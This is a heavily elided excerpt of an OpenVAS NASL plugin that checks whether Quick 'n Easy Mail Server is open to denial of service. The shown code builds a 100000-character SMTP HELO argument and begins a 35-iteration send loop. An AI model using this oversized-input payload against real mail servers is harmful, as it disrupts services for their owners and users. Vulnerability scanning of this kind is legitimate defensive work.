...
# $Id: quick_easy_mail_server_34814.nasl 15 2013-10-27 12:49:54Z jan $
#
...
if (description)
{
 ...
 script_summary("Determine if Quick 'n Easy Mail Server is vulnerable to DoS");
...
if(get_port_state(port))
{
  ...
  if (soctcp25)
  {
    ...
    close(soctcp25);
    data = string("HELO ");
    data += crap(length: 100000, data:"OpenVAS@openvas.org");
    data += string("\r\n");
    for(i=0; i<35; i++)
    {
